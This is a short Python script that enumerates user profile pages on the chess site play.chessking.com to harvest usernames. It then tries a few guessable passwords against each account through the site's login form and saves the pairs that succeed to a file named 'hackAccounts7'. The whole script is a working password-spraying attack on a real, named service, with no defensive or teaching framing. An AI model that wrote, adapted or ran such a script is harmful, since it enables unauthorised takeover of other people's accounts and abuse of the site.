import requests, time, random

def getNumericPart(string):
    res = ''
    for i in string:
        if (i.isnumeric()): res = res + i
    return res

accounts = 0
while 1:
    i = random.randint(3, 953901)
    r = requests.get(
        "https://play.chessking.com/user/"+str(i),
        headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}
    )
    try:
        login = r.text.split('style="color: #000000; max-width: 160px;" title="')[1].split('"')[0]
        accounts = accounts + 1
    except: continue
    passwords = ['chess', 'if[vfns', 'шахматы']
    for password in passwords:
        if (len(password) < 3): continue
        r = requests.post(
        "https://play.chessking.com/login",
        {"LoginOrEmail" : login, "Password" : password, "ReturnUrl" : ''},
        headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"},
        )
        if (len(r.text) > 50000):
           myfile = open("hackAccounts7", "a")
           myfile.write(login + ' ' + password + "\n")
           myfile.close()
           break
        print(accounts, login, password)
#        print("password " + password + " checked!")
    if (r.status_code != 200): print(r.status_code)
#    print("Account " + login + " checked!")
    if (accounts % 100 == 0):
        myfile = open("AccountStatictic", "w")
        myfile.write(str(accounts))
        myfile.close()
